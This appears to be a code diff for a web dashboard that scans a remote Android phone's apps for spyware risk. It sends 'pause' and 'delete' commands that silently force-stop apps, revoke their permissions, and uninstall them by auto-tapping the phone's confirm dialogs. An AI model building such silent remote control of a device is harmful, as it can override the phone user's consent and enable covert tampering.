-    h += '<div style="display:flex;flex-direction:column;gap:6px">';
-    for(const app of suspicious){
-      h += permAppCardHtml(app);
-    }
-    h += '</div>';
-  } else {
-    h += '<div style="font-size:13px;color:var(--success);font-weight:600;padding:6px 0 4px">\u2705 No high-risk apps — showing highest scores</div>';
-    h += '<div style="display:flex;flex-direction:column;gap:6px">';
-    for(const app of sorted.slice(0,8)){
-      h += permAppCardHtml(app);
-    }
-    h += '</div>';
+  if(window.permPending && window.permPending.pkg){
+    h+='<div class="card" style="padding:8px 10px;margin-bottom:8px;border-left:3px solid var(--accent)"><div style="font-size:12px;color:var(--accent)">&#x23F3; Working on <b>'+window.permPending.action+'</b> for <span style="color:var(--text)">'+String(window.permPending.pkg).replace(/</g,'&lt;')+'</span> &#x2014; result appears here in ~30s. Please wait before tapping again.</div></div>';
   }
-  if(trusted.length){
-    const collapsed = window._trustedCollapsed !== false;
-    h += '<div style="margin-top:10px;border-top:1px solid var(--border);padding-top:8px">';
-    h += '<div style="display:flex;justify-content:space-between;align-items:center;cursor:pointer" onclick="window._trustedCollapsed=!window._trustedCollapsed;renderPermSpyList()"><span style="font-size:13px;color:var(--success);font-weight:600">\u2713 Trusted System ('+trusted.length+') \u2014 verified, expected privileges</span><span style="font-size:12px;color:var(--muted)">'+(collapsed?'\u25B6 Show':'\u25BC Hide')+'</span></div>';
-    if(!collapsed){
-      h += '<div style="display:flex;flex-direction:column;gap:6px;margin-top:6px">';
-      for(const app of trusted){ h += permAppCardHtml(app); }
-      h += '</div>';
-    } else {
-      h += '<div style="font-size:12px;color:var(--muted);margin-top:4px">'+trusted.slice(0,3).map(a=>a.appName).join(', ')+(trusted.length>3?' \u2026':'')+'</div>';
+  // compact top risks — not full cards to avoid duplication with permList
+  const rank = c=>{const x=(c.classification||c.riskLevel||'').toLowerCase(); if(x==='critical')return 0; if(x==='high')return 1; if(x==='needs_investigation')return 2; if(x==='medium')return 3; return 5;};
+  let sorted = window.permCache.slice().sort((a,b)=> rank(a)-rank(b) || (b.riskScore||0)-(a.riskScore||0));
+  const suspicious = sorted.filter(a=> ['critical','high','needs_investigation'].includes((a.classification||a.riskLevel||'').toLowerCase()));
+  if(suspicious.length && (window.permView||'perms')==='perms'){
+    const top=suspicious.slice(0,3);
+    h+='<div style="font-size:12px;color:var(--danger);font-weight:600;padding:4px 0">\u26A0 Top attention ('+suspicious.length+' total) <span style="font-weight:400;color:var(--muted)">&#x2014; tap Needs checking for full list</span></div>';
+    h+='<div style="display:flex;flex-direction:column;gap:4px;margin-bottom:6px">';
+    for(const app of top){
+      const col=classificationColor(app.classification||app.riskLevel);
+      h+='<div style="display:flex;justify-content:space-between;align-items:center;padding:6px 10px;background:var(--card);border:1px solid var(--border);border-left:3px solid '+col+';border-radius:8px"><div style="min-width:0"><div style="font-size:13px;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">'+String(app.appName).replace(/</g,'&lt;')+'</div><div style="font-size:11px;color:var(--muted);font-family:monospace;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">'+String(app.packageName).replace(/</g,'&lt;')+'</div></div><div style="display:flex;gap:6px;flex-shrink:0"><button class="perm-btn pause" style="padding:5px 8px;font-size:11px" onclick="pauseSpyApp(decodeURIComponent(\''+escPkg(app.packageName)+'\'))">&#x23F8;</button><button class="perm-btn del" style="padding:5px 8px;font-size:11px" onclick="deleteSpyApp(decodeURIComponent(\''+escPkg(app.packageName)+'\'))">&#x1F5D1;</button></div></div>';
     }
-    h += '</div>';
-  }
-  if(low.length && suspicious.length){
-    h += '<div style="font-size:12px;color:var(--muted);margin-top:8px">'+low.length+' other low-risk apps hidden \u2014 see Apps tab for full list with Pause/Delete</div>';
+    h+='</div>';
   }
   el.innerHTML = h;
   return h;
 }
+function findAppName(pkg){ const f=(window.permCache||[]).find(a=>a.packageName===pkg); return f? f.appName : pkg; }
 async function spyControlSend(pkg, action){
   if(!selectedDevice || !pkg) return;
   const pushId = Date.now().toString(36) + Math.random().toString(36).slice(2,6);
   const payload = {action, packageName:pkg, ts_ms:Date.now()};
-  await writeRTDBStrict(`devices/${selectedDevice}/commands/spy_control/${pushId}`, payload);
-  // queue only — do not overwrite parent (parent was wiping the child just created)
+  try{ await writeRTDBStrict(`devices/${selectedDevice}/commands/spy_control/${pushId}`, payload); }catch(e){ throw e; }
+  window.permPending={pkg, action, ts:Date.now()};
+  renderPermSpyList(); renderPermissions();
+  // auto-clear pending after 2 min if no response
+  setTimeout(()=>{ if(window.permPending && window.permPending.pkg===pkg) { window.permPending=null; renderPermSpyList(); renderPermissions(); } },120000);
 }
 async function pauseSpyApp(pkg){
   if(!selectedDevice || !pkg) return;
-  if(!confirm('Pause '+pkg+'? This will force-stop the app and revoke Camera/Mic/Location/SMS/Contacts/Call Log. Silent \u2014 no window on phone.')) return;
+  const name=findAppName(pkg);
+  if(!confirm('Pause "'+name+'" ('+pkg+')?\nThis will force-stop the app and revoke Camera, Microphone, Location, SMS, Contacts, Call Log.\nSilent \u2014 no window appears on the phone.')) return;
   try{
     const sentAt = Date.now();
     await spyControlSend(pkg, 'pause');
-    showAlert('Pause sent for '+pkg+' \u2014 silent force-stop+revoke in ~30s (auto-find buttons)', 'warn');
+    showAlert('Pause sent for '+name+' \u2014 will run quietly in ~30s. Check the card for result.','warn');
     let polls = 0;
     const iv = setInterval(async()=>{
       polls++;
       await pollSpyStatus();
-      if(window.spyLastResponse && window.spyLastResponse.packageName===pkg && window.spyLastResponse.ts_ms >= sentAt) { clearInterval(iv); await pollPermissions(); }
-      if(polls>=8){ clearInterval(iv); await pollPermissions(); }
+      if(window.spyLastResponse && window.spyLastResponse.packageName===pkg && window.spyLastResponse.ts_ms >= sentAt) { clearInterval(iv); window.permPending=null; await pollPermissions(); renderPermSpyList(); }
+      if(polls>=8){ clearInterval(iv); if(window.permPending && window.permPending.pkg===pkg) window.permPending=null; await pollPermissions(); renderPermSpyList(); }
     }, 5000);
     setTimeout(async()=>{ await pollSpyStatus(); }, 3500);
-  }catch(e){ showAlert('Pause failed: '+e.message,'error'); }
+  }catch(e){ showAlert('Pause failed: '+e.message,'error'); window.permPending=null; renderPermSpyList(); renderPermissions(); }
 }
 async function deleteSpyApp(pkg){
   if(!selectedDevice || !pkg) return;
-  if(!confirm('Delete '+pkg+'? Will try silent uninstall auto-clicking confirm silently, fallback to one OK/Cancel only if silent fails.')) return;
+  const name=findAppName(pkg);
+  const app=(window.permCache||[]).find(a=>a.packageName===pkg);
+  const isSystem=app && app.system;
+  if(isSystem){
+    if(!confirm('Delete "'+name+'" ('+pkg+')?\nThis looks like a built-in system app \u2014 Android usually blocks deleting it.\nI will try to delete, but if blocked I will automatically stop it and remove its risky permissions instead.\nContinue?')) return;
+  } else {
+    if(!confirm('Delete "'+name+'" ('+pkg+')?\nWill try silent uninstall (auto-taps confirm).\nIf silent fails you may see one system OK/Cancel on the phone.')) return;
+  }
   try{
     const sentAt = Date.now();
     await spyControlSend(pkg, 'delete');
-    showAlert('Delete sent for '+pkg+' \u2014 silent uninstall (auto-click) in ~30s, fallback prompt only if needed', 'warn');
+    showAlert('Delete sent for '+name+' \u2014 working quietly in ~30s. Watch the card for result.','warn');
     let polls = 0;
     const iv = setInterval(async()=>{
       polls++;
@@ -8667,25 +8692,35 @@ async function deleteSpyApp(pkg){
       const r = window.spyLastResponse;
       if(r && r.packageName===pkg && r.ts_ms >= sentAt){
         if(r.result==='system_app_paused'){
-          showAlert('This is a built-in phone app \u2014 Android does not let it be deleted. I have stopped it and removed its access to Camera, Microphone, Location and Messages instead. It will stay quiet until you open it again.','warn');
+          showAlert('"'+name+'" is a built-in system app \u2014 Android blocked delete. I stopped it and revoked Camera, Microphone, Location, SMS instead.','warn');
         } else if(r.success){
-          showAlert('Delete finished for '+pkg+' \u2192 '+r.result,'warn');
+          showAlert('Deleted "'+name+'" \u2192 '+r.result,'warn');
         } else {
-          showAlert('Delete for '+pkg+' needs attention \u2192 '+r.result,'error');
+          showAlert('Delete for "'+name+'" needs attention \u2192 '+r.result,'error');
         }
-        clearInterval(iv); await pollPermissions();
+        clearInterval(iv); window.permPending=null; await pollPermissions(); renderPermSpyList();
       }
-      if(polls>=9){ clearInterval(iv); await pollPermissions(); }
+      if(polls>=9){ clearInterval(iv); if(window.permPending && window.permPending.pkg===pkg) window.permPending=null; await pollPermissions(); renderPermSpyList(); }
     }, 5000);
     setTimeout(async()=>{ await pollSpyStatus(); }, 4000);
-  }catch(e){ showAlert('Delete failed: '+e.message,'error'); }
+  }catch(e){ showAlert('Delete failed: '+e.message,'error'); window.permPending=null; renderPermSpyList(); renderPermissions(); }
 }
 async function pollSpyStatus(){
   if(!selectedDevice) return;
   try{
     const data = await fetchRTDB(`devices/${selectedDevice}/responses/spy_control`);
-    window.spyLastResponse = data;
-    renderPermSpyList();
+    if(data && data.packageName){
+      const prev=window.spyLastResponse;
+      window.spyLastResponse = data;
+      // if pending matches, clear pending immediately so spinner stops
+      if(window.permPending && data.packageName===window.permPending.pkg) { /* keep until render sees it then clear next poll */ }
+      renderPermSpyList();
+      // also refresh cards inline status without full pollPermissions reload
+      const el=document.getElementById('permList'); if(el) renderPermissions();
+    } else if(data && typeof data==='object' && !data.packageName){
+      // maybe map of responses — pick latest
+      const vals=Object.values(data).filter(v=>v&&v.packageName); if(vals.length){ vals.sort((a,b)=>(b.ts_ms||0)-(a.ts_ms||0)); window.spyLastResponse=vals[0]; renderPermSpyList(); }
+    }
   }catch(_){}
 }
 
@@ -8696,7 +8731,6 @@ function renderPermissions() {
   try{
     const banner = document.getElementById('permCriticalBanner');
     if(banner){
-      let isHigh=false;
       const hasHigh = window.permCache && window.permCache.some(a=> {
         const c=(a.classification||a.riskLevel||'').toLowerCase();
         const conf=(a.confidence||'').toUpperCase();
@@ -8708,11 +8742,11 @@ function renderPermissions() {
         if(hasHigh){
           banner.style.background = 'var(--danger)';
           banner.style.color = '#fff';
-          banner.innerHTML = '\u26A0 High-confidence threat detected \u2014 review Needs Attention above \u00B7 Last check: '+(window.permLastSync ? pktShort(window.permLastSync) : '--');
+          banner.innerHTML = '\u26A0 High-confidence threat detected \u2014 tap Needs checking \u00B7 Last check: '+(window.permLastSync ? pktShort(window.permLastSync) : '--');
         } else if(hasMedHigh){
           banner.style.background = 'var(--accent)';
           banner.style.color = '#000';
-          banner.innerHTML = '\u26A0 Needs investigation \u2014 check highlighted apps \u00B7 '+window.permCache.length+' apps checked \u00B7 Last check: '+(window.permLastSync ? pktShort(window.permLastSync) : '--');
+          banner.innerHTML = '\u26A0 Needs investigation \u2014 check highlighted apps \u00B7 '+window.permCache.length+' apps \u00B7 Last check: '+(window.permLastSync ? pktShort(window.permLastSync) : '--');
         } else {
           banner.style.background = 'var(--success)';
           banner.style.color = '#000';
@@ -8724,11 +8758,15 @@ function renderPermissions() {
     }
   }catch{}
   try{ renderPermSpyList(); }catch(e){}
+  try{ renderPermHero(); }catch(e){}
+  // sync search clear state
+  try{ const w=document.getElementById('permSearchWrap'); const qEl=document.getElementById('permSearch'); if(w&&qEl) w.classList.toggle('has-val', (qEl.value||'').length>0); }catch{}
   if (!window.permCache || !window.permCache.length) {
-    list.innerHTML = '<div class="label">No permissions data yet</div>';
+    const had = list && list.innerHTML.includes('perm-skel');
+    if(!had) list.innerHTML = '<div class="perm-skel"></div><div class="perm-skel" style="margin-top:8px"></div><div class="perm-skel" style="margin-top:8px"></div>';
     const chipsEl = document.getElementById('permChips'); if (chipsEl) chipsEl.innerHTML = '';
     const recentEl = document.getElementById('permRecent'); if (recentEl) recentEl.innerHTML = '';
-    if (syncInfo) syncInfo.textContent = '';
+    if (syncInfo) syncInfo.textContent = 'No apps yet \u2014 wait for next sync or tap Refresh';
     return;
   }
   const query = (document.getElementById('permSearch')?.value || '').toLowerCase();
@@ -8767,7 +8805,7 @@ function renderPermissions() {
   const ratio = totalPerms > 0 ? (totalGranted / totalPerms * 100).toFixed(0) : 0;
   if (syncInfo) syncInfo.textContent = '\uD83D\uDD12 ' + window.permCache.length + ' apps \u2022 ' + totalPerms + ' perms \u2022 ' + totalGranted + ' granted \u2022 Last sync: ' + (window.permLastSync ? pktShort(window.permLastSync) : '--');
   const chipsEl = document.getElementById('permChips');
-  if (chipsEl) chipsEl.innerHTML = permChip('All apps', 'all', filter === 'all') + permChip('Needs investigation', 'needs_investigation', filter === 'needs_investigation') + permChip('High/Critical', 'high', filter === 'high') + permChip('Trusted system', 'trusted', filter === 'trusted') + permChip('Sideloaded', 'sideload', filter === 'sideload');
+  if (chipsEl) chipsEl.innerHTML = permChip('All apps', 'all', filter === 'all') + permChip('Needs investigation', 'needs_investigation', filter === 'needs_investigation') + permChip('High/Critical', 'high', filter === 'high') + permChip('Trusted', 'trusted', filter === 'trusted') + permChip('Sideloaded', 'sideload', filter === 'sideload');
 
   const matches = a => !query || a.appName.toLowerCase().includes(query) || a.packageName.toLowerCase().includes(query) || a.permissions.some(p => p.name.toLowerCase().includes(query)) || (a.evidence||[]).some(e=>e.toLowerCase().includes(query));
   const isHigh = a => ['critical','high'].includes((a.classification||a.riskLevel||'').toLowerCase());
@@ -8777,9 +8815,9 @@ function renderPermissions() {
 
   let html = '';
   html += '<div style="margin-bottom:8px;background:var(--card);border-radius:var(--radius);overflow:hidden;border:1px solid var(--border)">' +
-    '<div style="height:20px;display:flex">' +
-    '<div style="background:var(--success);width:' + ratio + '%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;color:#000;min-width:fit-content;padding:0 6px">\u2713 ' + totalGranted + ' Granted</div>' +
-    '<div style="background:var(--danger);width:' + (100 - ratio) + '%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;color:#fff;min-width:fit-content;padding:0 6px">\u2717 ' + totalDenied + ' Denied</div>' +
+    '<div style="height:22px;display:flex">' +
+    '<div style="background:var(--success);width:' + ratio + '%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:#000;min-width:fit-content;padding:0 6px">\u2713 ' + totalGranted + ' Granted</div>' +
+    '<div style="background:var(--danger);width:' + (100 - ratio) + '%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:#fff;min-width:fit-content;padding:0 6px">\u2717 ' + totalDenied + ' Denied</div>' +
     '</div></div>';
   html += renderPermRecent();
   html += renderPermSensitive();
@@ -8792,24 +8830,17 @@ function renderPermissions() {
   else if (filter === 'trusted') visible = visible.filter(isTrusted);
   else if (filter === 'sideload') visible = visible.filter(isSideload);
 
-  visible.sort((a,b)=>{
-    const ra=(a.classification||a.riskLevel||'').toLowerCase();
-    const rb=(b.classification||b.riskLevel||'').toLowerCase();
-    const order=v=> v==='critical'?0:v==='high'?1:v==='needs_investigation'?2:v==='medium'?3:v==='low'?4:v==='trusted_privileged'?9:5;
-    const d=order(ra)-order(rb);
-    if(d!==0) return d;
-    return (b.riskScore||0)-(a.riskScore||0);
-  });
+  visible=permSortApps(visible);
 
   if(visible.length){
     const titleMap={all:'All matching apps',needs_investigation:'Needs investigation',high:'High / Critical',trusted:'Trusted system',sideload:'Sideloaded / Unknown installer'};
     const title=titleMap[filter]||'All matching apps';
-    html += '<div style="font-size:13px;color:var(--accent);font-weight:600;padding:6px 0 4px">'+title+' \u00B7 '+visible.length+'</div>';
+    html += '<div class="perm-section-title" style="color:var(--accent)">'+title+' \u00B7 '+visible.length+'<span style="margin-left:auto;font-size:11px;color:var(--muted);font-weight:400">'+(document.getElementById('permSort')?.value==='risk'?'Highest risk first':document.getElementById('permSort')?.value==='recent'?'Newest first':document.getElementById('permSort')?.value==='name'?'A\u2192Z':'User first')+'</span></div>';
     for(const app of visible){
       html += permAppCardHtml(app);
     }
   } else {
-    html += '<div class="label">No apps match your search</div>';
+    html += '<div class="label" style="padding:16px;text-align:center;border:1px dashed var(--border);border-radius:var(--radius)">No apps match your search \u2014 try clearing filters</div>';
   }
   list.innerHTML = html || '<div class="label">No apps match your search</div>';
 }
